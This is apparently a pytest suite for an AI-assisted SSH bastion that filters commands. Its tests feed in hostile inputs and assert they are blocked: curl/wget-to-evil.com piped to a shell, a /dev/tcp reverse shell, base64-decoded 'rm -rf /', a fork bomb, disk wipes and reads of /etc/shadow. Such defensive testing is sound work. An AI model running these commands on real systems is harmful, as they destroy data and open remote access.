"""
ПОЛНЫЙ ГЛУБОКИЙ ТЕСТ — 4SSH_CONTROL
Покрывает ВСЕ модули, ВСЕ функции, ВСЕ пути, ВСЕ обходы.

Структура:
  A. RuleEngine — sanitization, blacklist, whitelist, escalation, chains, obfuscation bypasses
  B. RuleEngine — sensitive paths, dangerous content, binary inspection
  C. NetworkRuleEngine — all vendors, all rule types, edge cases
  D. PolicyEnforcer — RBAC deterministic, extract_base_command, time policy
  E. LLMClient — chat_json parsing, BOM, markdown blocks, empty responses
  F. Consensus — all 3 strategies, weights, edge cases
  G. Audit — DB lifecycle, migration, retention, session logs, stats
  H. Alerts — SSRF protection, severity, HTML escape
  I. Config — load_config edge cases, _build_dataclass
  J. Models — SessionContext, enums, history
  K. Engine — full pipeline, script inspection, rate limiting, agent failure handling
  L. NetworkConfigAgent — prompt building, LLM response parsing
  M. Dashboard — rendering, HTML escape, profile column
  N. Bastion — shell detection, profile detection, interactive programs, role resolution
  O. Bypass attempts — obfuscation, unicode, chaining, encoding, GTFOBins
"""

from __future__ import annotations

import json
import os
import re
import sqlite3
import sys
import time
from pathlib import Path
from unittest.mock import MagicMock, patch, PropertyMock

import pytest

sys.path.insert(0, str(Path(__file__).parent))

from ai_defense.core.config import (
    AppConfig, AuditConfig, BlacklistRule, BastionConfig, ConsensusConfig,
    DangerousContent, DashboardConfig, EscalationRule, LLMConfig,
    NetworkProfileRules, RBACConfig, RolePolicy, RulesConfig, SensitivePath,
    TargetProfile, TimePolicy, UserMapping, AgentToggle, AlertsConfig,
    TelegramConfig, WebhookConfig, load_config, _build_dataclass,
)
from ai_defense.core.models import (
    AgentDecision, CommandCategory, FinalVerdict, SessionCommand,
    SessionContext, Severity, Verdict,
)
from ai_defense.core.rule_engine import (
    RuleEngine, _normalize_paths, _normalize_shell_obfuscation,
    _unwrap_prefix_commands, _decode_ansi_c, _normalize_command_name,
    _normalize_rm_flags,
)
from ai_defense.core.network_rule_engine import NetworkRuleEngine
from ai_defense.core.consensus import ConsensusEngine
from ai_defense.core.audit import AuditLogger
from ai_defense.core.alerts import AlertEngine, _max_severity, _escape_html
from ai_defense.core.engine import (
    _extract_script_path, _is_binary, _shell_quote, _fetch_script_content,
    fetch_network_config, _fetch_via_exec, _fetch_via_shell,
)


# ═══════════════════════════════════════════════════════════════════
# A. RuleEngine — sanitization, blacklist, whitelist, escalation
# ═══════════════════════════════════════════════════════════════════

@pytest.fixture
def cfg():
    return load_config("config.yaml")

@pytest.fixture
def rule_engine(cfg):
    return RuleEngine(cfg.rules)


class TestSanitization:
    def test_ansi_escape_stripped(self):
        assert RuleEngine.sanitize("\x1b[31mls\x1b[0m") == "ls"

    def test_control_chars_replaced(self):
        assert RuleEngine.sanitize("ls\x01\x02-la") == "ls -la"

    def test_unicode_confusables_normalized(self):
        result = RuleEngine.sanitize("r\u2212m -rf /")
        assert result == "r-m -rf /"  # unicode minus becomes ASCII hyphen

    def test_ansi_c_quote_decoded(self):
        assert "rm" in RuleEngine.sanitize("$'\\x72\\x6d' -rf /")

    def test_multi_spaces_collapsed(self):
        result = RuleEngine.sanitize("ls   -la    /tmp")
        assert "  " not in result

    def test_path_traversal_normalized(self):
        result = _normalize_paths("cat /tmp/../../etc/shadow")
        assert "/etc/shadow" in result

    def test_multi_slash_normalized(self):
        assert "/etc/shadow" in _normalize_paths("///etc///shadow")

    def test_dot_slash_normalized(self):
        assert "/etc/shadow" in _normalize_paths("/etc/./shadow")

    def test_command_name_dequoting_backslash(self):
        assert _normalize_command_name("r\\m -rf /") == "rm -rf /"

    def test_command_name_dequoting_quotes(self):
        assert _normalize_command_name("'r'm -rf /") == "rm -rf /"

    def test_rm_flags_normalization(self):
        assert "rm -rf /" in _normalize_rm_flags("rm --recursive --force /")
        assert "rm -rf /" in _normalize_rm_flags("rm -r -f /")

    def test_prefix_unwrap_sudo(self):
        result = _unwrap_prefix_commands("sudo rm -rf /")
        assert "rm -rf /" in result

    def test_prefix_unwrap_chroot(self):
        result = _unwrap_prefix_commands("chroot /mnt rm -rf /")
        assert "rm -rf /" in result

    def test_prefix_unwrap_env(self):
        result = _unwrap_prefix_commands("env VAR=1 rm -rf /")
        assert "rm -rf /" in result

    def test_prefix_unwrap_nested(self):
        result = _unwrap_prefix_commands("sudo env nice rm -rf /")
        assert "rm -rf /" in result

    def test_decode_ansi_c_invalid(self):
        assert _decode_ansi_c("\\xZZ") is not None

    def test_empty_sanitize(self):
        assert RuleEngine.sanitize("") == ""
        assert RuleEngine.sanitize("   ") == ""

    def test_comment_passthrough(self):
        result = RuleEngine.sanitize("# this is a comment")
        assert result.startswith("#")


class TestBlacklist:
    def test_rm_rf_root(self, rule_engine):
        r = rule_engine.evaluate("rm -rf /")
        assert r and r.verdict == Verdict.DENY

    def test_rm_rf_star(self, rule_engine):
        r = rule_engine.evaluate("rm -rf *")
        assert r and r.verdict == Verdict.DENY

    def test_dd_block_device(self, rule_engine):
        r = rule_engine.evaluate("dd if=/dev/zero of=/dev/sda")
        assert r and r.verdict == Verdict.DENY

    def test_mkfs(self, rule_engine):
        r = rule_engine.evaluate("mkfs.ext4 /dev/sda1")
        assert r and r.verdict == Verdict.DENY

    def test_fork_bomb(self, rule_engine):
        r = rule_engine.evaluate(":(){ :|:& };:")
        assert r and r.verdict == Verdict.DENY

    def test_wget_pipe_bash(self, rule_engine):
        r = rule_engine.evaluate("wget http://evil.com/x.sh | bash")
        assert r and r.verdict == Verdict.DENY

    def test_curl_pipe_sh(self, rule_engine):
        r = rule_engine.evaluate("curl http://evil.com/x.sh | sh")
        assert r and r.verdict == Verdict.DENY

    def test_dev_tcp_reverse_shell(self, rule_engine):
        r = rule_engine.evaluate("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        assert r and r.verdict == Verdict.DENY

    def test_history_clear(self, rule_engine):
        r = rule_engine.evaluate("history -c")
        assert r and r.verdict == Verdict.DENY

    def test_base64_exec(self, rule_engine):
        r = rule_engine.evaluate("echo cm0gLXJmIC8= | base64 -d | bash")
        assert r and r.verdict == Verdict.DENY

    def test_eval_substitution(self, rule_engine):
        r = rule_engine.evaluate("eval $(echo rm)")
        assert r and r.verdict == Verdict.DENY

    def test_python_oneliner(self, rule_engine):
        r = rule_engine.evaluate("python3 -c 'import os; os.system(\"rm -rf /\")'")
        assert r and r.verdict == Verdict.DENY

    def test_nc_listener(self, rule_engine):
        r = rule_engine.evaluate("nc -lp 4444")
        assert r and r.verdict == Verdict.DENY

    def test_iptables_flush(self, rule_engine):
        r = rule_engine.evaluate("iptables -F")
        assert r and r.verdict == Verdict.DENY

    def test_shutdown(self, rule_engine):
        r = rule_engine.evaluate("shutdown -h now")
        assert r and r.verdict == Verdict.DENY

    def test_reboot(self, rule_engine):
        r = rule_engine.evaluate("reboot")
        assert r and r.verdict == Verdict.DENY

    def test_ufw_disable(self, rule_engine):
        r = rule_engine.evaluate("ufw disable")
        assert r and r.verdict == Verdict.DENY

    def test_ifs_obfuscation(self, rule_engine):
        r = rule_engine.evaluate("${IFS}rm -rf /")
        assert r and r.verdict == Verdict.DENY

    def test_chmod_777(self, rule_engine):
        r = rule_engine.evaluate("chmod 777 /etc/passwd")
        assert r and r.verdict == Verdict.DENY

    def test_find_exec_shell(self, rule_engine):
        r = rule_engine.evaluate("find / -exec bash -c 'id' \\;")
        assert r and r.verdict == Verdict.DENY

    def test_echo_pipe_bash(self, rule_engine):
        r = rule_engine.evaluate("echo 'rm -rf /' | bash")
        assert r and r.verdict == Verdict.DENY


class TestWhitelist:
    def test_ls(self, rule_engine):
        r = rule_engine.evaluate("ls")
        assert r and r.verdict == Verdict.ALLOW

    def test_pwd(self, rule_engine):
        r = rule_engine.evaluate("pwd")
        assert r and r.verdict == Verdict.ALLOW

    def test_ls_la(self, rule_engine):
        r = rule_engine.evaluate("ls -la")
        assert r and r.verdict == Verdict.ALLOW

    def test_df_h(self, rule_engine):
        r = rule_engine.evaluate("df -h")
        assert r and r.verdict == Verdict.ALLOW

    def test_ps_aux(self, rule_engine):
        r = rule_engine.evaluate("ps aux")
        assert r and r.verdict == Verdict.ALLOW

    def test_comment_ignored(self, rule_engine):
        r = rule_engine.evaluate("# rm -rf /")
        assert r is None


class TestEscalationRules:
    def test_kill_pid_1(self, rule_engine):
        r = rule_engine.evaluate("kill 1")
        assert r and r.verdict == Verdict.DENY

    def test_kill_sshd(self, rule_engine):
        r = rule_engine.evaluate("killall sshd")
        assert r and r.verdict == Verdict.DENY

    def test_mv_sbin(self, rule_engine):
        r = rule_engine.evaluate("mv /usr/sbin/sshd /tmp/")
        assert r and r.verdict == Verdict.DENY

    def test_chmod_suid(self, rule_engine):
        r = rule_engine.evaluate("chmod u+s /tmp/shell")
        assert r and r.verdict == Verdict.DENY

    def test_export_ld_preload(self, rule_engine):
        r = rule_engine.evaluate("export LD_PRELOAD=/tmp/evil.so")
        assert r and r.verdict == Verdict.DENY

    def test_alias_sudo(self, rule_engine):
        r = rule_engine.evaluate("alias sudo='evil'")
        assert r and r.verdict == Verdict.DENY

    def test_systemctl_stop(self, rule_engine):
        r = rule_engine.evaluate("systemctl stop nginx")
        assert r and r.verdict == Verdict.ESCALATE

    def test_ssh_tunnel(self, rule_engine):
        r = rule_engine.evaluate("ssh -L 8080:localhost:80 user@host")
        assert r and r.verdict == Verdict.ESCALATE

    def test_nmap(self, rule_engine):
        r = rule_engine.evaluate("nmap 192.168.1.0/24")
        assert r and r.verdict == Verdict.ESCALATE

    def test_strace(self, rule_engine):
        r = rule_engine.evaluate("strace -p 1234")
        assert r and r.verdict == Verdict.ESCALATE

    def test_tcpdump(self, rule_engine):
        r = rule_engine.evaluate("tcpdump -i eth0")
        assert r and r.verdict == Verdict.ESCALATE

    def test_insmod(self, rule_engine):
        r = rule_engine.evaluate("insmod /tmp/evil.ko")
        assert r and r.verdict == Verdict.ESCALATE

    def test_mount(self, rule_engine):
        r = rule_engine.evaluate("mount /dev/sdb1 /mnt")
        assert r and r.verdict == Verdict.ESCALATE

    def test_docker_privileged(self, rule_engine):
        r = rule_engine.evaluate("docker run --privileged -it ubuntu bash")
        assert r and r.verdict == Verdict.ESCALATE

    def test_useradd(self, rule_engine):
        r = rule_engine.evaluate("useradd hacker")
        assert r and r.verdict == Verdict.ESCALATE

    def test_chroot(self, rule_engine):
        r = rule_engine.evaluate("chroot /newroot /bin/bash")
        assert r and r.verdict == Verdict.ESCALATE

    def test_tee_etc(self, rule_engine):
        r = rule_engine.evaluate("tee /etc/cron.d/evil")
        assert r and r.verdict == Verdict.ESCALATE

    def test_wget_save(self, rule_engine):
        r = rule_engine.evaluate("wget -O /tmp/backdoor http://evil.com/x")
        assert r and r.verdict == Verdict.ESCALATE

    def test_gcc(self, rule_engine):
        r = rule_engine.evaluate("gcc -o exploit exploit.c")
        assert r and r.verdict == Verdict.ESCALATE


class TestSensitivePaths:
    def test_etc_shadow_deny(self, rule_engine):
        r = rule_engine.evaluate("cat /etc/shadow")
        assert r and r.verdict == Verdict.DENY

    def test_etc_sudoers_deny(self, rule_engine):
        r = rule_engine.evaluate("vim /etc/sudoers")
        assert r and r.verdict == Verdict.DENY

    def test_etc_passwd_escalate(self, rule_engine):
        r = rule_engine.evaluate("cat /etc/passwd")
        assert r and r.verdict == Verdict.ESCALATE

    def test_authorized_keys(self, rule_engine):
        r = rule_engine.evaluate("cat .ssh/authorized_keys")
        assert r and r.verdict == Verdict.DENY

    def test_pam_modules(self, rule_engine):
        r = rule_engine.evaluate("ls /etc/pam.d/")
        assert r and r.verdict == Verdict.DENY

    def test_ld_preload_file(self, rule_engine):
        r = rule_engine.evaluate("cat /etc/ld.so.preload")
        assert r and r.verdict == Verdict.DENY


class TestChainedCommands:
    def test_safe_then_dangerous(self, rule_engine):
        r = rule_engine.evaluate("ls; rm -rf /")
        assert r and r.verdict == Verdict.DENY

    def test_and_chain(self, rule_engine):
        r = rule_engine.evaluate("echo ok && rm -rf /")
        assert r and r.verdict == Verdict.DENY

    def test_or_chain(self, rule_engine):
        r = rule_engine.evaluate("false || rm -rf /")
        assert r and r.verdict == Verdict.DENY

    def test_backtick_injection(self, rule_engine):
        r = rule_engine.evaluate("echo `rm -rf /`")
        assert r and r.verdict == Verdict.DENY

    def test_command_substitution(self, rule_engine):
        r = rule_engine.evaluate("echo $(rm -rf /)")
        assert r and r.verdict == Verdict.DENY

    def test_safe_chain_passes(self, rule_engine):
        r = rule_engine.evaluate("ls; pwd")
        assert r is None  # passes to agents


class TestContentMonitor:
    def test_reverse_shell_content(self, rule_engine):
        r = rule_engine.scan_content("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        assert r and r.verdict == Verdict.DENY

    def test_ssh_key_content(self, rule_engine):
        r = rule_engine.scan_content("ssh-rsa AAAAB3NzaC1yc2EAAAADA...")
        assert r and r.verdict == Verdict.DENY

    def test_sudoers_content(self, rule_engine):
        r = rule_engine.scan_content("hacker ALL=(ALL) NOPASSWD: ALL")
        assert r and r.verdict == Verdict.DENY

    def test_safe_content(self, rule_engine):
        r = rule_engine.scan_content("echo hello world")
        assert r is None


class TestBinaryInspection:
    def test_bin_sh_in_binary(self, rule_engine):
        r = rule_engine.scan_strings("ELF\n/bin/sh\nsomething")
        assert r and r.verdict == Verdict.DENY

    def test_dev_tcp_in_binary(self, rule_engine):
        r = rule_engine.scan_strings("ELF\n/dev/tcp/10.0.0.1\n")
        assert r and r.verdict == Verdict.DENY

    def test_clean_binary(self, rule_engine):
        r = rule_engine.scan_strings("ELF\nprintf\nmalloc\nfree\n")
        assert r is None

    def test_keylogger_binary(self, rule_engine):
        r = rule_engine.scan_strings("keylogger\nXGrabKey\n")
        assert r and r.verdict == Verdict.DENY


# ═══════════════════════════════════════════════════════════════════
# B. NetworkRuleEngine — all vendors
# ═══════════════════════════════════════════════════════════════════

class TestNetworkRuleEngineAllVendors:
    @pytest.fixture
    def nre_cisco(self, cfg):
        return NetworkRuleEngine(cfg.target_profiles["cisco_ios"])

    @pytest.fixture
    def nre_junos(self, cfg):
        return NetworkRuleEngine(cfg.target_profiles["junos"])

    @pytest.fixture
    def nre_mikrotik(self, cfg):
        return NetworkRuleEngine(cfg.target_profiles["mikrotik"])

    @pytest.fixture
    def nre_huawei(self, cfg):
        return NetworkRuleEngine(cfg.target_profiles["huawei_vrp"])

    @pytest.fixture
    def nre_arista(self, cfg):
        return NetworkRuleEngine(cfg.target_profiles["arista_eos"])

    # Cisco IOS
    def test_cisco_show_allow(self, nre_cisco):
        assert nre_cisco.evaluate("show running-config").verdict == Verdict.ALLOW

    def test_cisco_ping_allow(self, nre_cisco):
        assert nre_cisco.evaluate("ping 8.8.8.8").verdict == Verdict.ALLOW

    def test_cisco_write_erase_deny(self, nre_cisco):
        assert nre_cisco.evaluate("write erase").verdict == Verdict.DENY

    def test_cisco_no_router_ospf_deny(self, nre_cisco):
        r = nre_cisco.evaluate("no router ospf 1")
        assert r.verdict in (Verdict.DENY, Verdict.ESCALATE)

    def test_cisco_shutdown_deny(self, nre_cisco):
        r = nre_cisco.evaluate("shutdown")
        assert r.verdict in (Verdict.DENY, Verdict.ESCALATE)

    def test_cisco_clear_bgp_deny(self, nre_cisco):
        r = nre_cisco.evaluate("clear ip bgp *")
        assert r.verdict in (Verdict.DENY, Verdict.ESCALATE)

    def test_cisco_interface_escalate(self, nre_cisco):
        r = nre_cisco.evaluate("interface GigabitEthernet0/0")
        assert r.verdict == Verdict.ESCALATE

    def test_cisco_router_ospf_escalate(self, nre_cisco):
        r = nre_cisco.evaluate("router ospf 1")
        assert r.verdict == Verdict.ESCALATE

    def test_cisco_configure_unknown(self, nre_cisco):
        r = nre_cisco.evaluate("configure terminal")
        assert r is None

    def test_cisco_no_aaa(self, nre_cisco):
        r = nre_cisco.evaluate("no aaa authentication")
        assert r.verdict in (Verdict.DENY, Verdict.ESCALATE)

    def test_cisco_no_ip_ssh(self, nre_cisco):
        r = nre_cisco.evaluate("no ip ssh")
        assert r.verdict in (Verdict.DENY, Verdict.ESCALATE)

    def test_cisco_snmp_rw(self, nre_cisco):
        r = nre_cisco.evaluate("snmp-server community public RW")
        assert r.verdict in (Verdict.DENY, Verdict.ESCALATE)

    # JunOS
    def test_junos_show_allow(self, nre_junos):
        assert nre_junos.evaluate("show interfaces").verdict == Verdict.ALLOW

    def test_junos_request_reboot_deny(self, nre_junos):
        assert nre_junos.evaluate("request system reboot").verdict == Verdict.DENY

    def test_junos_request_zeroize_deny(self, nre_junos):
        assert nre_junos.evaluate("request system zeroize").verdict == Verdict.DENY

    def test_junos_delete_protocols_deny(self, nre_junos):
        assert nre_junos.evaluate("delete protocols ospf").verdict == Verdict.DENY

    def test_junos_load_override_deny(self, nre_junos):
        assert nre_junos.evaluate("load override /tmp/cfg").verdict == Verdict.DENY

    def test_junos_commit_escalate(self, nre_junos):
        assert nre_junos.evaluate("commit").verdict == Verdict.ESCALATE

    def test_junos_set_interfaces_escalate(self, nre_junos):
        assert nre_junos.evaluate("set interfaces ge-0/0/0 unit 0 family inet address 10.0.0.1/24").verdict == Verdict.ESCALATE

    # MikroTik
    def test_mikrotik_print_allow(self, nre_mikrotik):
        assert nre_mikrotik.evaluate("ip address print").verdict == Verdict.ALLOW

    def test_mikrotik_reset_deny(self, nre_mikrotik):
        r = nre_mikrotik.evaluate("system reset-configuration")
        assert r.verdict in (Verdict.DENY, Verdict.ESCALATE)

    def test_mikrotik_reboot_deny(self, nre_mikrotik):
        r = nre_mikrotik.evaluate("system reboot")
        assert r.verdict in (Verdict.DENY, Verdict.ESCALATE)

    def test_mikrotik_ip_address_add_escalate(self, nre_mikrotik):
        assert nre_mikrotik.evaluate("ip address add address=10.0.0.1/24 interface=ether1").verdict == Verdict.ESCALATE

    def test_mikrotik_firewall_escalate(self, nre_mikrotik):
        assert nre_mikrotik.evaluate("ip firewall filter add").verdict == Verdict.ESCALATE

    # Huawei
    def test_huawei_display_allow(self, nre_huawei):
        assert nre_huawei.evaluate("display ip routing-table").verdict == Verdict.ALLOW

    def test_huawei_reset_config_deny(self, nre_huawei):
        r = nre_huawei.evaluate("reset saved-configuration")
        assert r.verdict in (Verdict.DENY, Verdict.ESCALATE)

    def test_huawei_undo_ospf_deny(self, nre_huawei):
        r = nre_huawei.evaluate("undo ospf 1")
        assert r.verdict in (Verdict.DENY, Verdict.ESCALATE)

    def test_huawei_interface_escalate(self, nre_huawei):
        assert nre_huawei.evaluate("interface GigabitEthernet0/0/1").verdict == Verdict.ESCALATE

    def test_huawei_save_escalate(self, nre_huawei):
        assert nre_huawei.evaluate("save").verdict == Verdict.ESCALATE

    # Arista
    def test_arista_show_allow(self, nre_arista):
        assert nre_arista.evaluate("show ip route").verdict == Verdict.ALLOW

    def test_arista_write_erase_deny(self, nre_arista):
        assert nre_arista.evaluate("write erase").verdict == Verdict.DENY

    def test_arista_no_router_bgp_deny(self, nre_arista):
        r = nre_arista.evaluate("no router bgp 65000")
        assert r.verdict in (Verdict.DENY, Verdict.ESCALATE)

    def test_arista_interface_escalate(self, nre_arista):
        assert nre_arista.evaluate("interface Ethernet1").verdict == Verdict.ESCALATE

    # Edge cases
    def test_empty_command(self, nre_cisco):
        assert nre_cisco.evaluate("") is None

    def test_control_chars_stripped(self, nre_cisco):
        r = nre_cisco.evaluate("\x01\x02show\x03 version")
        assert r is not None and r.verdict == Verdict.ALLOW


# ═══════════════════════════════════════════════════════════════════
# C. PolicyEnforcer — RBAC deterministic checks
# ═══════════════════════════════════════════════════════════════════

class TestPolicyEnforcer:
    def _make_pe(self, roles, users=None):
        from ai_defense.agents.policy_enforcer import PolicyEnforcerAgent
        rbac = RBACConfig(
            roles={name: RolePolicy(**kw) for name, kw in roles.items()},
            users={name: UserMapping(role=r) for name, r in (users or {}).items()},
            time_policy=TimePolicy(),
        )
        return PolicyEnforcerAgent(MagicMock(), rbac)

    def test_denied_command_exact(self):
        pe = self._make_pe({"dev": {"denied_commands": ["rm"], "allowed_commands": ["ls"]}})
        r = pe._check_rbac_deterministic("rm file.txt", pe._rbac.roles["dev"])
        assert r and r.verdict == Verdict.DENY

    def test_denied_multiword(self):
        pe = self._make_pe({"ops": {"denied_commands": ["rm -rf /"], "allowed_commands": ["*"]}})
        r = pe._check_rbac_deterministic("rm -rf /", pe._rbac.roles["ops"])
        assert r and r.verdict == Verdict.DENY

    def test_allowed_wildcard_passes(self):
        pe = self._make_pe({"ops": {"denied_commands": [], "allowed_commands": ["*"]}})
        r = pe._check_rbac_deterministic("ls -la", pe._rbac.roles["ops"])
        assert r is None

    def test_not_in_allowed_escalates(self):
        pe = self._make_pe({"dev": {"denied_commands": [], "allowed_commands": ["ls", "cat"]}})
        r = pe._check_rbac_deterministic("wget http://evil.com", pe._rbac.roles["dev"])
        assert r and r.verdict == Verdict.ESCALATE

    def test_sudo_stripped(self):
        pe = self._make_pe({"dev": {"denied_commands": ["rm"], "allowed_commands": ["ls"]}})
        r = pe._check_rbac_deterministic("sudo rm file.txt", pe._rbac.roles["dev"])
        assert r and r.verdict == Verdict.DENY

    def test_unknown_role_escalates(self):
        pe = self._make_pe({"dev": {"denied_commands": [], "allowed_commands": ["ls"]}})
        r = pe.evaluate("ls", "user", "nonexistent")
        assert r.verdict == Verdict.ESCALATE

    def test_empty_command(self):
        pe = self._make_pe({"dev": {"denied_commands": ["rm"], "allowed_commands": ["ls"]}})
        r = pe._check_rbac_deterministic("", pe._rbac.roles["dev"])
        assert r is None

    def test_extract_base_command_busybox(self):
        from ai_defense.agents.policy_enforcer import PolicyEnforcerAgent
        assert PolicyEnforcerAgent._extract_base_command("busybox wget http://evil") == "wget"

    def test_extract_base_command_env(self):
        from ai_defense.agents.policy_enforcer import PolicyEnforcerAgent
        assert PolicyEnforcerAgent._extract_base_command("env VAR=1 rm file") == "rm"

    def test_extract_base_command_env_flags(self):
        from ai_defense.agents.policy_enforcer import PolicyEnforcerAgent
        assert PolicyEnforcerAgent._extract_base_command("env -i PATH=/usr/bin rm -rf /") == "rm"

    def test_extract_base_command_env_no_args(self):
        from ai_defense.agents.policy_enforcer import PolicyEnforcerAgent
        assert PolicyEnforcerAgent._extract_base_command("env ls") == "ls"


# ═══════════════════════════════════════════════════════════════════
# D. LLMClient — JSON parsing edge cases
# ═══════════════════════════════════════════════════════════════════

class TestLLMClientParsing:
    def test_chat_json_valid(self):
        from ai_defense.core.llm_client import LLMClient
        client = MagicMock(spec=LLMClient)
        client.chat_json = LLMClient.chat_json.__get__(client)
        client.chat = MagicMock(return_value='{"verdict": "allow", "confidence": 0.9}')
        result = client.chat_json("sys", "user")
        assert result["verdict"] == "allow"

    def test_chat_json_with_bom(self):
        from ai_defense.core.llm_client import LLMClient
        client = MagicMock(spec=LLMClient)
        client.chat_json = LLMClient.chat_json.__get__(client)
        client.chat = MagicMock(return_value='\ufeff{"verdict": "deny"}')
        result = client.chat_json("sys", "user")
        assert result["verdict"] == "deny"

    def test_chat_json_with_markdown(self):
        from ai_defense.core.llm_client import LLMClient
        client = MagicMock(spec=LLMClient)
        client.chat_json = LLMClient.chat_json.__get__(client)
        client.chat = MagicMock(return_value='```json\n{"verdict": "escalate"}\n```')
        result = client.chat_json("sys", "user")
        assert result["verdict"] == "escalate"

    def test_chat_json_invalid(self):
        from ai_defense.core.llm_client import LLMClient
        client = MagicMock(spec=LLMClient)
        client.chat_json = LLMClient.chat_json.__get__(client)
        client.chat = MagicMock(return_value='not json at all')
        result = client.chat_json("sys", "user")
        assert "error" in result

    def test_chat_json_empty(self):
        from ai_defense.core.llm_client import LLMClient
        client = MagicMock(spec=LLMClient)
        client.chat_json = LLMClient.chat_json.__get__(client)
        client.chat = MagicMock(return_value='')
        result = client.chat_json("sys", "user")
        assert "error" in result


# ═══════════════════════════════════════════════════════════════════
# E. Consensus — all strategies
# ═══════════════════════════════════════════════════════════════════

class TestConsensusAll:
    def _d(self, name, verdict, conf=0.9, weight=1.0):
        return AgentDecision(agent_name=name, verdict=verdict, confidence=conf, reason="test")

    def test_weighted_majority_allow(self):
        ce = ConsensusEngine(ConsensusConfig(strategy="weighted_majority", deny_threshold=0.5))
        r = ce.decide([self._d("a", Verdict.ALLOW), self._d("b", Verdict.ALLOW)])
        assert r.verdict == Verdict.ALLOW

    def test_weighted_majority_deny(self):
        ce = ConsensusEngine(ConsensusConfig(strategy="weighted_majority", deny_threshold=0.5))
        r = ce.decide([self._d("a", Verdict.DENY), self._d("b", Verdict.DENY)])
        assert r.verdict == Verdict.DENY

    def test_weighted_majority_disagreement(self):
        ce = ConsensusEngine(ConsensusConfig(strategy="weighted_majority", deny_threshold=0.5, escalate_on_disagreement=True))
        r = ce.decide([self._d("a", Verdict.ALLOW), self._d("b", Verdict.DENY, conf=0.4)])
        assert r.verdict in (Verdict.ALLOW, Verdict.ESCALATE, Verdict.DENY)

    def test_any_deny_strategy(self):
        ce = ConsensusEngine(ConsensusConfig(strategy="any_deny"))
        r = ce.decide([self._d("a", Verdict.ALLOW), self._d("b", Verdict.DENY)])
        assert r.verdict == Verdict.DENY

    def test_any_deny_escalate(self):
        ce = ConsensusEngine(ConsensusConfig(strategy="any_deny"))
        r = ce.decide([self._d("a", Verdict.ALLOW), self._d("b", Verdict.ESCALATE)])
        assert r.verdict == Verdict.ESCALATE

    def test_any_deny_all_allow(self):
        ce = ConsensusEngine(ConsensusConfig(strategy="any_deny"))
        r = ce.decide([self._d("a", Verdict.ALLOW)])
        assert r.verdict == Verdict.ALLOW

    def test_unanimous_agree(self):
        ce = ConsensusEngine(ConsensusConfig(strategy="unanimous"))
        r = ce.decide([self._d("a", Verdict.ALLOW), self._d("b", Verdict.ALLOW)])
        assert r.verdict == Verdict.ALLOW

    def test_unanimous_disagree(self):
        ce = ConsensusEngine(ConsensusConfig(strategy="unanimous"))
        r = ce.decide([self._d("a", Verdict.ALLOW), self._d("b", Verdict.ESCALATE)])
        assert r.verdict == Verdict.ESCALATE

    def test_unanimous_deny(self):
        ce = ConsensusEngine(ConsensusConfig(strategy="unanimous"))
        r = ce.decide([self._d("a", Verdict.ALLOW), self._d("b", Verdict.DENY)])
        assert r.verdict == Verdict.DENY

    def test_empty_decisions(self):
        ce = ConsensusEngine(ConsensusConfig())
        r = ce.decide([])
        assert r.verdict == Verdict.ESCALATE

    def test_weights_affect_result(self):
        ce = ConsensusEngine(ConsensusConfig(strategy="weighted_majority", deny_threshold=0.5),
                             {"heavy": 10.0, "light": 0.1})
        r = ce.decide([self._d("heavy", Verdict.ALLOW), self._d("light", Verdict.DENY)])
        assert r.verdict == Verdict.ALLOW


# ═══════════════════════════════════════════════════════════════════
# F. Audit — full lifecycle
# ═══════════════════════════════════════════════════════════════════

class TestAuditFull:
    def _logger(self, tmp_path, name="test"):
        return AuditLogger(AuditConfig(
            db_path=str(tmp_path / f"{name}.db"),
            json_log=str(tmp_path / f"{name}.jsonl"),
            retention_days=90,
        ))

    def test_session_lifecycle(self, tmp_path):
        logger = self._logger(tmp_path)
        s = SessionContext(username="admin", role="ops")
        logger.log_session_start(s)
        v = FinalVerdict(verdict=Verdict.ALLOW, decisions=[
            AgentDecision(agent_name="test", verdict=Verdict.ALLOW, confidence=1.0, reason="ok")
        ], reason="ok")
        logger.log_decision(s, "ls", v)
        logger.log_session_end(s)

        stats = logger.get_stats()
        assert stats["total_commands"] == 1
        assert stats["total_sessions"] == 1

        logs = logger.get_recent_logs(10)
        assert len(logs) == 1
        assert logs[0]["command"] == "ls"

        session_logs = logger.get_session_logs(s.session_id)
        assert len(session_logs) == 1
        logger.close()

    def test_retention_cleanup(self, tmp_path):
        logger = AuditLogger(AuditConfig(
            db_path=str(tmp_path / "ret.db"),
            json_log=str(tmp_path / "ret.jsonl"),
            retention_days=1,
        ))
        s = SessionContext(username="admin", role="ops")
        logger.log_session_start(s)
        old_ts = time.time() - 2 * 86400
        with logger._lock:
            logger._conn.execute(
                "INSERT INTO audit_log (timestamp, session_id, username, role, command, verdict, reason) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (old_ts, s.session_id, "old", "ops", "old_cmd", "allow", "old")
            )
            logger._conn.commit()
        deleted = logger.cleanup_old_records()
        assert deleted >= 1
        logger.close()

    def test_retention_zero_days(self, tmp_path):
        logger = AuditLogger(AuditConfig(
            db_path=str(tmp_path / "ret0.db"),
            json_log=str(tmp_path / "ret0.jsonl"),
            retention_days=0,
        ))
        assert logger.cleanup_old_records() == 0
        logger.close()

    def test_escalated_flag(self, tmp_path):
        logger = self._logger(tmp_path, "esc")
        s = SessionContext(username="admin", role="ops")
        logger.log_session_start(s)
        v = FinalVerdict(verdict=Verdict.ALLOW, decisions=[], reason="admin approved", escalated=True)
        logger.log_decision(s, "rm -rf /tmp/test", v)
        logs = logger.get_recent_logs()
        assert logs[0]["escalated"] == 1
        logger.close()


# ═══════════════════════════════════════════════════════════════════
# G. Alerts — SSRF protection
# ═══════════════════════════════════════════════════════════════════

class TestAlerts:
    def test_ssrf_localhost(self):
        assert AlertEngine._is_safe_url("http://localhost:8080/") is False

    def test_ssrf_127(self):
        assert AlertEngine._is_safe_url("http://127.0.0.1:8080/") is False

    def test_ssrf_10_network(self):
        assert AlertEngine._is_safe_url("http://10.0.0.1/") is False

    def test_ssrf_172_16(self):
        assert AlertEngine._is_safe_url("http://172.16.0.1/") is False

    def test_ssrf_192_168(self):
        assert AlertEngine._is_safe_url("http://192.168.1.1/") is False

    def test_ssrf_link_local(self):
        assert AlertEngine._is_safe_url("http://169.254.169.254/latest/") is False

    def test_public_url_ok(self):
        assert AlertEngine._is_safe_url("https://hooks.slack.com/services/xxx") is True

    def test_empty_url(self):
        assert AlertEngine._is_safe_url("") is False

    def test_invalid_url(self):
        assert AlertEngine._is_safe_url("not a url at all") is False

